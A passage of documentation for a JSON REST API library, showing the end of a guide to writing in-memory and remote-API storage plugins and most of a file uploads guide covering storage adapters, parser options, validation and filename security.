      const scope = scopes[scopeName];
      const schemaRelationships = scope.vars.schemaInfo.schemaRelationships;
      
      for (const [relName, relDef] of Object.entries(schemaRelationships)) {
        if (relDef.type === 'belongsTo' && record.attributes[relDef.foreignKey]) {
          data.relationships[relName] = {
            data: {
              type: relDef.resource,
              id: String(record.attributes[relDef.foreignKey])
            }
          };
        }
      }
      
      return data;
    };
    
    // 4. QUERY RESOURCES
    helpers.dataQuery = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      let records = Array.from(collection.values());
      
      // Apply filters
      if (context.queryParams.filters) {
        records = records.filter(record => {
          return Object.entries(context.queryParams.filters).every(([field, value]) => {
            // Support nested field filtering (e.g., author.name)
            if (field.includes('.')) {
              // For simplicity, skip nested filters in this example
              return true;
            }
            return record.attributes[field] === value;
          });
        });
      }
      
      // Apply sorting
      if (context.queryParams.sort?.length > 0) {
        records.sort((a, b) => {
          for (const sortField of context.queryParams.sort) {
            const desc = sortField.startsWith('-');
            const field = desc ? sortField.substring(1) : sortField;
            
            const aVal = a.attributes[field];
            const bVal = b.attributes[field];
            
            if (aVal < bVal) return desc ? 1 : -1;
            if (aVal > bVal) return desc ? -1 : 1;
          }
          return 0;
        });
      }
      
      // Calculate pagination
      const page = context.queryParams.page || {};
      const pageSize = Math.min(page.size || 20, 100);
      const pageNumber = page.number || 1;
      const total = records.length;
      const pageCount = Math.ceil(total / pageSize);
      
      // Apply pagination
      const start = (pageNumber - 1) * pageSize;
      const paginatedRecords = records.slice(start, start + pageSize);
      
      // Build response
      const data = paginatedRecords.map((record, index) => ({
        type: scopeName,
        id: record.id,
        attributes: { ...record.attributes },
        relationships: {}
      }));
      
      // Add relationships to each record
      const scope = scopes[scopeName];
      const schemaRelationships = scope.vars.schemaInfo.schemaRelationships;
      
      data.forEach((item, index) => {
        const record = paginatedRecords[index];
        for (const [relName, relDef] of Object.entries(schemaRelationships)) {
          if (relDef.type === 'belongsTo' && record.attributes[relDef.foreignKey]) {
            item.relationships[relName] = {
              data: {
                type: relDef.resource,
                id: String(record.attributes[relDef.foreignKey])
              }
            };
          } else if (relDef.type === 'hasMany' && record.relationships?.[relName]) {
            item.relationships[relName] = {
              data: record.relationships[relName].map(id => ({
                type: relDef.resource,
                id: String(id)
              }))
            };
          }
        }
      });
      
      // Handle includes
      const included = [];
      if (context.queryParams.include?.length > 0) {
        const includedIds = new Set();
        
        for (const item of data) {
          for (const includePath of context.queryParams.include) {
            const relName = includePath.split('.')[0];
            const relationship = item.relationships[relName];
            
            if (relationship?.data) {
              const relData = Array.isArray(relationship.data) 
                ? relationship.data 
                : [relationship.data];
                
              for (const rel of relData) {
                const key = `${rel.type}:${rel.id}`;
                if (!includedIds.has(key)) {
                  includedIds.add(key);
                  const relCollection = getCollection(rel.type);
                  const relRecord = relCollection.get(rel.id);
                  if (relRecord) {
                    included.push({
                      type: rel.type,
                      id: rel.id,
                      attributes: { ...relRecord.attributes }
                    });
                  }
                }
              }
            }
          }
        }
      }
      
      // Build pagination links
      const baseUrl = `/${scopeName}`;
      const queryString = new URLSearchParams();
      if (page.size) queryString.set('page[size]', pageSize);
      
      const links = {
        first: `${baseUrl}?${queryString}&page[number]=1`,
        last: `${baseUrl}?${queryString}&page[number]=${pageCount}`,
      };
      
      if (pageNumber > 1) {
        links.prev = `${baseUrl}?${queryString}&page[number]=${pageNumber - 1}`;
      }
      if (pageNumber < pageCount) {
        links.next = `${baseUrl}?${queryString}&page[number]=${pageNumber + 1}`;
      }
      
      return {
        data,
        ...(included.length > 0 && { included }),
        meta: {
          page: pageNumber,
          pageSize,
          pageCount,
          total
        },
        links
      };
    };
    
    // 5. CREATE RESOURCE
    helpers.dataPost = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      const id = generateId();
      
      const record = {
        id,
        attributes: { ...context.inputRecord.data.attributes },
        relationships: {}
      };
      
      // Extract belongsTo foreign keys from relationships
      if (context.inputRecord.data.relationships) {
        const scope = scopes[scopeName];
        const schemaRelationships = scope.vars.schemaInfo.schemaRelationships;
        
        for (const [relName, relData] of Object.entries(context.inputRecord.data.relationships)) {
          const relDef = schemaRelationships[relName];
          if (relDef?.type === 'belongsTo' && relData.data) {
            record.attributes[relDef.foreignKey] = relData.data.id;
          } else if (relDef?.type === 'hasMany' && relData.data) {
            record.relationships[relName] = relData.data.map(item => item.id);
          }
        }
      }
      
      collection.set(id, record);
      return id;
    };
    
    // 6. REPLACE RESOURCE
    helpers.dataPut = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      const id = String(context.id);
      
      if (!context.isCreate && !collection.has(id)) {
        const { RestApiResourceError } = await import('../../lib/rest-api-errors.js');
        throw new RestApiResourceError('Resource not found', {
          subtype: 'not_found',
          resourceType: scopeName,
          resourceId: context.id
        });
      }
      
      const record = {
        id,
        attributes: { ...context.inputRecord.data.attributes },
        relationships: {}
      };
      
      // Extract belongsTo foreign keys
      if (context.inputRecord.data.relationships) {
        const scope = scopes[scopeName];
        const schemaRelationships = scope.vars.schemaInfo.schemaRelationships;
        
        for (const [relName, relData] of Object.entries(context.inputRecord.data.relationships)) {
          const relDef = schemaRelationships[relName];
          if (relDef?.type === 'belongsTo' && relData.data) {
            record.attributes[relDef.foreignKey] = relData.data.id;
          } else if (relDef?.type === 'hasMany' && relData.data) {
            record.relationships[relName] = relData.data.map(item => item.id);
          }
        }
      }
      
      collection.set(id, record);
    };
    
    // 7. UPDATE RESOURCE
    helpers.dataPatch = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      const id = String(context.id);
      const existing = collection.get(id);
      
      if (!existing) {
        const { RestApiResourceError } = await import('../../lib/rest-api-errors.js');
        throw new RestApiResourceError('Resource not found', {
          subtype: 'not_found',
          resourceType: scopeName,
          resourceId: context.id
        });
      }
      
      // Merge attributes
      if (context.inputRecord.data.attributes) {
        Object.assign(existing.attributes, context.inputRecord.data.attributes);
      }
      
      // Update relationships
      if (context.inputRecord.data.relationships) {
        const scope = scopes[scopeName];
        const schemaRelationships = scope.vars.schemaInfo.schemaRelationships;
        
        for (const [relName, relData] of Object.entries(context.inputRecord.data.relationships)) {
          const relDef = schemaRelationships[relName];
          if (relDef?.type === 'belongsTo') {
            if (relData.data === null) {
              delete existing.attributes[relDef.foreignKey];
            } else if (relData.data) {
              existing.attributes[relDef.foreignKey] = relData.data.id;
            }
          } else if (relDef?.type === 'hasMany' && relData.data) {
            existing.relationships[relName] = relData.data.map(item => item.id);
          }
        }
      }
    };
    
    // 8. DELETE RESOURCE
    helpers.dataDelete = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      const id = String(context.id);
      
      if (!collection.has(id)) {
        const { RestApiResourceError } = await import('../../lib/rest-api-errors.js');
        throw new RestApiResourceError('Resource not found', {
          subtype: 'not_found',
          resourceType: scopeName,
          resourceId: context.id
        });
      }
      
      collection.delete(id);
      return { success: true };
    };
    
    log.info('InMemoryStoragePlugin installed - data stored in memory');
  }
};
```

## Complete Example: Remote API Storage Plugin

Here's a storage plugin that proxies requests to a remote API:

```javascript
export const RemoteApiStoragePlugin = {
  name: 'remote-api-storage',
  dependencies: ['rest-api'],

  install({ helpers, vars, pluginOptions, log }) {
    const baseUrl = pluginOptions.baseUrl || 'https://api.example.com';
    const headers = {
      'Content-Type': 'application/vnd.api+json',
      'Accept': 'application/vnd.api+json',
      // Add authentication if needed
      ...(pluginOptions.token && { 'Authorization': `Bearer ${pluginOptions.token}` }),
      ...(pluginOptions.headers || {})
    };
    
    // Helper to make fetch requests
    const fetchApi = async (path, options = {}) => {
      const url = `${baseUrl}${path}`;
      const response = await fetch(url, {
        ...options,
        headers: {
          ...headers,
          ...options.headers
        }
      });
      
      if (!response.ok) {
        const error = await response.json().catch(() => ({ errors: [{ title: 'Request failed' }] }));
        const { RestApiResourceError } = await import('../../lib/rest-api-errors.js');
        throw new RestApiResourceError(
          error.errors?.[0]?.title || 'Remote API error',
          {
            subtype: response.status === 404 ? 'not_found' : 'remote_error',
            statusCode: response.status,
            errors: error.errors
          }
        );
      }
      
      return response.json();
    };
    
    // 1. CHECK EXISTS
    helpers.dataExists = async ({ scopeName, context }) => {
      try {
        await fetchApi(`/${scopeName}/${context.id}`, { method: 'HEAD' });
        return true;
      } catch (error) {
        if (error.statusCode === 404) return false;
        throw error;
      }
    };
    
    // 2. GET SINGLE RESOURCE
    helpers.dataGet = async ({ scopeName, context }) => {
      const queryParams = new URLSearchParams();
      
      // Add include parameter
      if (context.queryParams.include?.length > 0) {
        queryParams.set('include', context.queryParams.include.join(','));
      }
      
      // Add sparse fieldsets
      if (context.queryParams.fields) {
        for (const [type, fields] of Object.entries(context.queryParams.fields)) {
          queryParams.set(`fields[${type}]`, fields);
        }
      }
      
      const query = queryParams.toString();
      const path = `/${scopeName}/${context.id}${query ? `?${query}` : ''}`;
      
      return await fetchApi(path);
    };
    
    // 3. GET MINIMAL
    helpers.dataGetMinimal = async ({ scopeName, context }) => {
      const response = await fetchApi(`/${scopeName}/${context.id}`);
      return response.data;
    };
    
    // 4. QUERY RESOURCES
    helpers.dataQuery = async ({ scopeName, context }) => {
      const queryParams = new URLSearchParams();
      
      // Add filters
      if (context.queryParams.filters) {
        for (const [field, value] of Object.entries(context.queryParams.filters)) {
          queryParams.set(`filter[${field}]`, value);
        }
      }
      
      // Add sorting
      if (context.queryParams.sort?.length > 0) {
        queryParams.set('sort', context.queryParams.sort.join(','));
      }
      
      // Add pagination
      if (context.queryParams.page) {
        for (const [key, value] of Object.entries(context.queryParams.page)) {
          queryParams.set(`page[${key}]`, value);
        }
      }
      
      // Add includes
      if (context.queryParams.include?.length > 0) {
        queryParams.set('include', context.queryParams.include.join(','));
      }
      
      // Add sparse fieldsets
      if (context.queryParams.fields) {
        for (const [type, fields] of Object.entries(context.queryParams.fields)) {
          queryParams.set(`fields[${type}]`, fields);
        }
      }
      
      const query = queryParams.toString();
      const path = `/${scopeName}${query ? `?${query}` : ''}`;
      
      const response = await fetchApi(path);
      
      // Ensure proper structure
      return {
        data: response.data || [],
        included: response.included,
        meta: response.meta,
        links: response.links
      };
    };
    
    // 5. CREATE RESOURCE
    helpers.dataPost = async ({ scopeName, context }) => {
      const response = await fetchApi(`/${scopeName}`, {
        method: 'POST',
        body: JSON.stringify(context.inputRecord)
      });
      
      return response.data.id;
    };
    
    // 6. REPLACE RESOURCE
    helpers.dataPut = async ({ scopeName, context }) => {
      await fetchApi(`/${scopeName}/${context.id}`, {
        method: 'PUT',
        body: JSON.stringify(context.inputRecord)
      });
    };
    
    // 7. UPDATE RESOURCE
    helpers.dataPatch = async ({ scopeName, context }) => {
      await fetchApi(`/${scopeName}/${context.id}`, {
        method: 'PATCH',
        body: JSON.stringify(context.inputRecord)
      });
    };
    
    // 8. DELETE RESOURCE
    helpers.dataDelete = async ({ scopeName, context }) => {
      await fetchApi(`/${scopeName}/${context.id}`, {
        method: 'DELETE'
      });
      
      return { success: true };
    };
    
    log.info(`RemoteApiStoragePlugin installed - proxying to ${baseUrl}`);
  }
};
```

## Advanced Topics

### Transaction Support

If your storage supports transactions, the `context.db` parameter will automatically contain the transaction when one is active:

```javascript
helpers.dataPost = async ({ scopeName, context }) => {
  // context.db is automatically the transaction if one is active,
  // or the base connection if not in a transaction
  const db = context.db || defaultConnection;
  
  // For storage that supports transactions:
  if (context.transaction) {
    // We're in a transaction - ensure all operations use it
    await db.insert(scopeName, record);
  } else {
    // No transaction - use regular connection
    await db.insert(scopeName, record);
  }
};
```

### Sparse Fieldsets

When `context.queryParams.fields` is provided, only return the requested fields:

```javascript
// Example: fields[articles]=title,summary
// Can be a string or array depending on how it was parsed
const requestedFields = context.queryParams.fields[scopeName];
if (requestedFields) {
  const fields = Array.isArray(requestedFields) 
    ? requestedFields 
    : requestedFields.split(',');
    
  // Filter attributes to only include requested fields
  data.attributes = Object.fromEntries(
    Object.entries(data.attributes).filter(([key]) => fields.includes(key))
  );
  
  // Handle nested field requests like fields[articles]=title,author.name
  // The REST API plugin will handle nested field filtering for included resources
}
```

### Computed Fields and Dependencies

The REST API plugin handles computed fields, but you may need to ensure dependency fields are included:

```javascript
// context.computedDependencies tells you which fields are needed for computations
// Always include these fields even if not explicitly requested
```

### Search and Filter Implementation

For complex filtering, you'll need to parse the search schema:

```javascript
// context.schemaInfo.searchSchema defines what can be filtered
// context.queryParams.filters contains the actual filter values
```

### Error Handling

Always use the proper error classes:

```javascript
import { RestApiResourceError, RestApiValidationError } from '../../lib/rest-api-errors.js';

// For not found errors
throw new RestApiResourceError('Resource not found', {
  subtype: 'not_found',
  resourceType: scopeName,
  resourceId: id
});

// For validation errors
throw new RestApiValidationError('Invalid filter value', {
  fields: ['filters.status'],
  violations: [{
    field: 'filters.status',
    rule: 'invalid_value',
    message: 'Status must be one of: draft, published'
  }]
});
```

## Testing Your Storage Plugin

### Using the Test Suite

The JSON REST API test suite can be adapted for your storage plugin:

```javascript
import { createBasicApi } from './tests/fixtures/api-configs.js';
import { YourStoragePlugin } from './your-storage-plugin.js';

describe('Your Storage Plugin', () => {
  let api;
  
  before(async () => {
    // Create API with your storage instead of Knex
    api = await createApi({
      plugins: [
        [RestApiPlugin, { /* options */ }],
        [YourStoragePlugin, { /* options */ }],
        // ... other plugins
      ]
    });
  });
  
  it('should create and retrieve a resource', async () => {
    const result = await api.resources.articles.post({
      inputRecord: {
        data: {
          type: 'articles',
          attributes: {
            title: 'Test Article'
          }
        }
      }
    });
    
    const article = await api.resources.articles.get({ id: result.id });
    expect(article.data.attributes.title).to.equal('Test Article');
  });
});
```

### Storage-Specific Tests

Test edge cases specific to your storage:

```javascript
describe('Edge Cases', () => {
  it('should handle concurrent writes', async () => {
    // Test your storage's concurrency handling
  });
  
  it('should handle large datasets', async () => {
    // Test pagination with many records
  });
  
  it('should handle network failures gracefully', async () => {
    // For remote storage, test connection issues
  });
});
```

## Common Pitfalls & Best Practices

### 1. ID Type Conversion

JSON:API requires IDs to be strings, but your storage might use numbers:

```javascript
// Always convert IDs to strings in responses
data.id = String(record.id);

// Accept both strings and numbers in inputs
const id = String(context.id);
```

### 2. Relationship Format

Relationships must follow the JSON:API format exactly:

```javascript
// Correct - single relationship
relationships: {
  author: {
    data: { type: 'users', id: '123' }
  }
}

// Correct - to-many relationship
relationships: {
  tags: {
    data: [
      { type: 'tags', id: '1' },
      { type: 'tags', id: '2' }
    ]
  }
}

// Correct - empty relationship
relationships: {
  author: {
    data: null
  }
}
```

### 3. Error Response Format

Errors should include proper subtypes:

```javascript
// Use these standard subtypes
'not_found' - Resource doesn't exist
'validation_error' - Input validation failed
'permission_denied' - Insufficient permissions
'conflict' - Resource conflict (e.g., duplicate)
```

### 4. Pagination Meta

Always include pagination metadata for queries:

```javascript
meta: {
  page: 1,        // Current page
  pageSize: 20,   // Items per page
  pageCount: 5,   // Total pages
  total: 100      // Total items
}
```

### 5. Include Deduplication

When returning included resources, avoid duplicates:

```javascript
const includedMap = new Map();
// Use type:id as key to ensure uniqueness
includedMap.set(`${type}:${id}`, resource);
const included = Array.from(includedMap.values());
```

### 6. Performance Considerations

- Cache frequently accessed data
- Implement efficient filtering at the storage level
- Use bulk operations where possible
- Consider implementing cursor-based pagination for large datasets

### 7. Schema Information

Use the schema information provided in context:

```javascript
// Available in context.schemaInfo:
- tableName: Storage identifier for the resource
- idProperty: Primary key field name (might not be 'id')
- schema: Full schema definition
- schemaRelationships: Relationship definitions
- searchSchema: Filterable fields and their rules
```

## Conclusion

Creating a custom storage plugin gives you complete control over how data is stored and retrieved while leveraging all the features of the JSON REST API library. The key is to properly implement the 8 required helpers and ensure all responses follow the JSON:API specification.

Remember:
- Start with the in-memory example and adapt it to your needs
- Always return proper JSON:API formatted responses
- Use the provided error classes for consistency
- Test thoroughly with the existing test suite
- Refer to the Knex plugin source code for complex implementations

Happy coding!# File Uploads Guide

This guide explains how to handle file uploads in JSON REST API using the FileHandlingPlugin. The system is designed to be protocol-agnostic, storage-pluggable, and schema-driven.

## Table of Contents

1. [Overview](#overview)
2. [Quick Start](#quick-start)
3. [Schema Configuration](#schema-configuration)
4. [Storage Adapters](#storage-adapters)
5. [Protocol Configuration](#protocol-configuration)
6. [File Validation](#file-validation)
7. [Complete Examples](#complete-examples)
8. [Troubleshooting](#troubleshooting)

## Overview

The file handling system consists of three main components:

1. **FileHandlingPlugin** - Orchestrates file detection and processing
2. **Protocol Detectors** - Parse files from different protocols (HTTP, Express)
3. **Storage Adapters** - Save files to different backends (local, S3, etc.)

### How It Works

1. You define file fields in your schema with `type: 'file'`
2. Protocol plugins detect and parse multipart uploads
3. FileHandlingPlugin validates and processes files
4. Storage adapters save files and return URLs
5. File fields are replaced with URLs in your data

## Quick Start

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin, FileHandlingPlugin, ExpressPlugin } from 'json-rest-api';
import { LocalStorage } from 'json-rest-api/plugins/storage/local-storage.js';

// Create API
const api = new Api({ name: 'my-api' });

// Create storage
const storage = new LocalStorage({
  directory: './uploads',
  baseUrl: 'http://localhost:3000/uploads'
});

// Use plugins (order matters!)
api.use(RestApiPlugin);
api.use(FileHandlingPlugin);
api.use(ExpressPlugin);

// Define schema with file field
api.addScope('images', {
  schema: {
    title: { type: 'string', required: true },
    file: { 
      type: 'file',
      storage: storage,
      accepts: ['image/*'],
      maxSize: '10mb'
    }
  }
});
```

## Schema Configuration

File fields are defined in your scope schema with `type: 'file'`:

```javascript
api.addScope('documents', {
  schema: {
    // Regular fields
    title: { type: 'string', required: true },
    description: { type: 'string' },
    
    // File field
    attachment: {
      type: 'file',
      storage: myStorage,        // Required: storage adapter instance
      accepts: ['*'],            // Optional: accepted mime types (default: ['*'])
      maxSize: '50mb',           // Optional: max file size
      required: false            // Optional: is field required? (default: false)
    }
  }
});
```

### File Field Options

- **type**: Must be `'file'`
- **storage**: Storage adapter instance (required)
- **accepts**: Array of accepted MIME types
  - `['*']` - Accept any file type (default)
  - `['image/*']` - Accept any image
  - `['image/jpeg', 'image/png']` - Accept specific types
  - `['application/pdf', 'text/*']` - Mix specific and wildcard
- **maxSize**: Maximum file size
  - `'10mb'`, `'1.5gb'`, `'500kb'` - Human readable format
  - Number of bytes also supported
- **required**: Whether the file is required

## Storage Adapters

Storage adapters handle where and how files are saved. The library includes two built-in adapters.

### Storage Adapter Comparison

| Feature | LocalStorage | S3Storage |
|---------|-------------|-----------|
| **Production Ready** | ✅ Yes | ⚠️ Mock only |
| **Filename Strategies** | 4 (hash, timestamp, original, custom) | 1 (hash only) |
| **Path Traversal Protection** | ✅ Full | ✅ N/A |
| **Extension Whitelist** | ✅ Yes | ❌ No |
| **Duplicate Handling** | ✅ Yes | ✅ Automatic |
| **Custom Naming** | ✅ Yes | ❌ No |
| **Best For** | Local file storage | Cloud storage |

### S3Storage

Saves files to Amazon S3 or S3-compatible storage:

```javascript
import { S3Storage } from 'json-rest-api/plugins/storage/s3-storage.js';

const s3Storage = new S3Storage({
  bucket: 'my-uploads',                // S3 bucket name (required)
  region: 'us-east-1',                 // AWS region (default: 'us-east-1')
  prefix: 'uploads/',                  // Path prefix in bucket (default: '')
  acl: 'public-read',                  // Access control (default: 'public-read')
  mockMode: false                      // Use mock mode? (default: true)
});
```

**Filename Handling:**
- Always generates random hash + extension (e.g., `uploads/a7f8d9e2b4c6e1f3.jpg`)
- Original filenames are never used for security

**Note**: The included S3Storage is a mock implementation for demonstration. For production use, you'll need to implement the actual AWS SDK calls.

### LocalStorage

Saves files to the local filesystem with secure filename handling:

```javascript
import { LocalStorage } from 'json-rest-api/plugins/storage/local-storage.js';

const localStorage = new LocalStorage({
  directory: './uploads',              // Where to save files
  baseUrl: '/uploads',                 // Public URL prefix
  nameStrategy: 'hash',                // Filename strategy (see below)
  preserveExtension: true,             // Keep file extensions? (default: true)
  allowedExtensions: ['.jpg', '.png'], // Extension whitelist (optional)
  maxFilenameLength: 255,              // Max filename length
  nameGenerator: async (file) => {...} // Custom name generator (optional)
});
```

**Filename Strategies:**

1. **`'hash'`** (default) - Cryptographically secure random names
   ```javascript
   nameStrategy: 'hash'
   // Result: "a7f8d9e2b4c6e1f3.jpg"
   ```

2. **`'timestamp'`** - Timestamp with random suffix (sortable)
   ```javascript
   nameStrategy: 'timestamp'
   // Result: "1672531200000_a8f9.pdf"
   ```

3. **`'original'`** - Sanitized original filename (user-friendly)
   ```javascript
   nameStrategy: 'original'
   // "My Photo!.jpg" → "My_Photo_.jpg"
   // Duplicates → "My_Photo_1.jpg", "My_Photo_2.jpg"
   ```

4. **`'custom'`** - Your own naming logic
   ```javascript
   nameStrategy: 'custom',
   nameGenerator: async (file) => {
     const userId = file.metadata?.userId || 'anonymous';
     return `user_${userId}_${Date.now()}`;
   }
   // Result: "user_12345_1672531200000.jpg"
   ```

**Security Features:**
- Path traversal protection (removes `..` and `/`)
- Control character filtering
- Extension validation against whitelist
- Automatic duplicate handling
- MIME type to extension mapping

### Custom Storage Adapters

Create your own storage adapter by implementing the required interface:

```javascript
class MyCustomStorage {
  async upload(file) {
    // file object contains:
    // - filename: original filename
    // - mimetype: MIME type
    // - size: size in bytes
    // - data: Buffer with file contents
    // - filepath: temp file path (if using formidable)
    // - cleanup: async function to cleanup temp files
    
    // Save the file somewhere
    const url = await saveFileSomewhere(file);
    
    // Return the public URL
    return url;
  }
  
  async delete(url) {
    // Optional: implement file deletion
    await deleteFileSomewhere(url);
  }
}
```

## Protocol Configuration

Different protocols have different configuration options for file parsing.

### ExpressPlugin Configuration

The Express plugin supports multiple file parsers:

```javascript
api.use(ExpressPlugin, {
  // Choose parser: 'busboy', 'formidable', or a function
  fileParser: 'busboy',
  
  // Parser-specific options
  fileParserOptions: {
    // For busboy
    limits: {
      fileSize: 10 * 1024 * 1024,  // 10MB max file size
      files: 5,                     // Max 5 files per request
      fields: 20,                   // Max 20 non-file fields
      parts: 25                     // Max 25 total parts
    }
  },
  
  // Or use formidable
  // fileParser: 'formidable',
  // fileParserOptions: {
  //   uploadDir: './temp',        // Temp directory
  //   keepExtensions: true,       // Keep file extensions
  //   maxFileSize: 200 * 1024 * 1024  // 200MB max
  // }
  
  // Disable file uploads entirely
  // enableFileUploads: false
});
```

#### Using Express Middleware

For advanced use cases, you can use Express middleware for file handling:

```javascript
import multer from 'multer';

const upload = multer({ dest: 'uploads/' });

api.use(ExpressPlugin, {
  middleware: {
    beforeScope: {
      // Add multer to specific scope
      images: [upload.single('file')],
      
      // Multiple files for another scope
      gallery: [upload.array('photos', 10)]
    }
  },
  
  // Disable built-in file handling since we're using multer
  enableFileUploads: false
});
```

### HttpPlugin Configuration

The HTTP plugin has similar configuration:

```javascript
api.use(HttpPlugin, {
  // Choose parser: 'busboy', 'formidable', or a function
  fileParser: 'formidable',
  
  fileParserOptions: {
    uploadDir: './uploads/temp',
    keepExtensions: true,
    maxFileSize: 100 * 1024 * 1024  // 100MB
  },
  
  // Other HTTP options
  port: 3000,
  basePath: '/api'
});
```

### Custom File Parsers

You can provide a custom file parser:

```javascript
api.use(HttpPlugin, {
  fileParser: (options) => ({
    name: 'my-custom-parser',
    detect: (params) => {
      // Return true if this parser can handle the request
      const req = params._httpReq;
      return req.headers['content-type']?.includes('multipart/form-data');
    },
    parse: async (params) => {
      // Parse the request and return { fields, files }
      const req = params._httpReq;
      const { fields, files } = await myCustomParser(req);
      return { fields, files };
    }
  })
});
```

## File Validation

The FileHandlingPlugin automatically validates files based on schema configuration.

### MIME Type Validation

```javascript
// Accept only images
file: {
  type: 'file',
  storage: localStorage,
  accepts: ['image/*']
}

// Accept specific types
document: {
  type: 'file',
  storage: s3Storage,
  accepts: ['application/pdf', 'application/msword', 'text/plain']
}

// Accept anything (not recommended)
attachment: {
  type: 'file',
  storage: localStorage,
  accepts: ['*']
}
```

### Size Validation

```javascript
// Human-readable format
avatar: {
  type: 'file',
  storage: localStorage,
  maxSize: '5mb'
}

// Supports: b, kb, mb, gb
largeFile: {
  type: 'file',
  storage: s3Storage,
  maxSize: '1.5gb'
}
```

### Required Files

```javascript
// This file must be provided
document: {
  type: 'file',
  storage: s3Storage,
  required: true
}
```

### Validation Errors

When validation fails, you'll get appropriate error responses:

```json
{
  "errors": [{
    "status": "422",
    "title": "Validation Error",
    "detail": "Invalid file type for field 'avatar'",
    "source": {
      "pointer": "/data/attributes/avatar"
    }
  }]
}
```

## Complete Examples

### Basic Image Upload

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin, FileHandlingPlugin, ExpressPlugin } from 'json-rest-api';
import { LocalStorage } from 'json-rest-api/plugins/storage/local-storage.js';
import express from 'express';

// Setup
const api = new Api({ name: 'image-api' });
const storage = new LocalStorage({
  directory: './uploads/images',
  baseUrl: 'http://localhost:3000/uploads/images'
});

// Plugins
api.use(RestApiPlugin);
api.use(FileHandlingPlugin);
api.use(ExpressPlugin);

// Schema
api.addScope('photos', {
  schema: {
    caption: { type: 'string', required: true },
    image: {
      type: 'file',
      storage: storage,
      accepts: ['image/jpeg', 'image/png'],
      maxSize: '10mb',
      required: true
    }
  }
});

// Express app
const app = express();
app.use('/uploads', express.static('./uploads'));
api.express.mount(app);

// HTML form for testing
app.get('/', (req, res) => {
  res.send(`
    <form action="/api/photos" method="POST" enctype="multipart/form-data">
      <input name="caption" placeholder="Caption" required>
      <input name="image" type="file" accept="image/*" required>
      <button type="submit">Upload Photo</button>
    </form>
  `);
});

app.listen(3000).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

### Multiple Storage Backends

```javascript
// Different storage for different fields
api.addScope('articles', {
  schema: {
    title: { type: 'string', required: true },
    content: { type: 'string', required: true },
    
    // Featured image goes to S3
    featuredImage: {
      type: 'file',
      storage: s3Storage,
      accepts: ['image/*'],
      maxSize: '20mb'
    },
    
    // Attachments stay local
    attachment: {
      type: 'file',
      storage: localStorage,
      accepts: ['application/pdf', 'application/zip'],
      maxSize: '100mb'
    }
  }
});
```

### Filename Handling Examples

Different strategies for different use cases:

```javascript
import { LocalStorage } from 'json-rest-api/plugins/storage/local-storage.js';

// User avatars - use hash for security and deduplication
const avatarStorage = new LocalStorage({
  directory: './uploads/avatars',
  baseUrl: '/uploads/avatars',
  nameStrategy: 'hash'
});

// Documents - use timestamp for sorting
const documentStorage = new LocalStorage({
  directory: './uploads/documents',
  baseUrl: '/uploads/documents',
  nameStrategy: 'timestamp'
});

// User downloads - preserve original names
const downloadStorage = new LocalStorage({
  directory: './uploads/downloads',
  baseUrl: '/uploads/downloads',
  nameStrategy: 'original',
  maxFilenameLength: 100
});

// High security - no extensions
const secureStorage = new LocalStorage({
  directory: './uploads/secure',
  baseUrl: '/uploads/secure',
  nameStrategy: 'hash',
  preserveExtension: false,  // All files saved as .bin
  allowedExtensions: ['.pdf', '.doc', '.docx']  // Still validates input
});

// Organized by date
const organizedStorage = new LocalStorage({
  directory: './uploads',
  baseUrl: '/uploads',
  nameStrategy: 'custom',
  nameGenerator: async (file) => {
    const date = new Date();
    const dateDir = `${date.getFullYear()}/${String(date.getMonth() + 1).padStart(2, '0')}`;
    return `${dateDir}/${crypto.randomBytes(16).toString('hex')}`;
  }
});
// Saves as: "2024/01/a7f8d9e2b4c6e1f3.jpg"
```

### Using cURL

```bash
# Upload with cURL
curl -X POST http://localhost:3000/api/photos \
  -F "caption=Beautiful sunset" \
  -F "image=@/path/to/sunset.jpg"

# Multiple files
curl -X POST http://localhost:3000/api/articles \
  -F "title=My Article" \
  -F "content=Article content here" \
  -F "featuredImage=@/path/to/hero.jpg" \
  -F "attachment=@/path/to/document.pdf"
```

### Programmatic Upload

```javascript
// Using fetch with FormData
const formData = new FormData();
formData.append('caption', 'My photo');
formData.append('image', fileInput.files[0]);

const response = await fetch('/api/photos', {
  method: 'POST',
  body: formData
});

const result = await response.json();
console.log('Uploaded:', result.data.attributes.image); // URL of uploaded file
```

## Troubleshooting

### Common Issues

#### 1. "Busboy not available, file uploads disabled"

Install the peer dependency:
```bash
npm install busboy
```

#### 2. "No storage configured for file field"

Make sure you've set the storage property:
```javascript
file: {
  type: 'file',
  storage: myStorage  // This is required!
}
```

#### 3. Files not being detected

Check that:
1. The FileHandlingPlugin is loaded AFTER RestApiPlugin
2. Your protocol plugin has file uploads enabled
3. The request has proper multipart headers
4. You're using the correct form encoding

```html
<!-- HTML forms need this -->
<form enctype="multipart/form-data">
```

#### 4. "File too large" errors

Check both:
1. Schema `maxSize` configuration
2. Parser limits in plugin options

```javascript
// Both limits apply!
api.use(ExpressPlugin, {
  fileParserOptions: {
    limits: { fileSize: 10 * 1024 * 1024 }  // 10MB parser limit
  }
});

api.addScope('images', {
  schema: {
    photo: {
      type: 'file',
      maxSize: '5mb'  // 5MB schema limit (lower wins)
    }
  }
});
```

### Debug Mode

Enable debug logging to see what's happening:

```javascript
const api = new Api({
  name: 'my-api',
  logLevel: 'debug'  // or 'trace' for more detail
});
```

### Testing File Uploads

Use the included example to test your setup:

```javascript
// Run the example
node ./node_modules/json-rest-api/examples/file-upload-example.js
```

Then visit http://localhost:3000 to see the test forms.

## Best Practices

1. **Always validate file types** - Don't use `accepts: ['*']` in production
2. **Set reasonable size limits** - Prevent abuse and server overload
3. **Use appropriate storage** - Local for small files, S3 for large/many files
4. **Clean up temp files** - Storage adapters should handle cleanup
5. **Serve files separately** - Don't serve uploaded files through your API
6. **Validate file contents** - Consider virus scanning for user uploads
7. **Use CDN for images** - Serve uploaded images through a CDN in production

## Security Considerations

### Filename Security

1. **Never trust user filenames** - Always sanitize or generate new names
   ```javascript
   // BAD - Direct use of user filename
   const filename = file.originalname;
   
   // GOOD - Generate secure name
   const filename = crypto.randomBytes(16).toString('hex') + path.extname(file.originalname);
   ```

2. **Prevent path traversal** - Remove dangerous characters
   ```javascript
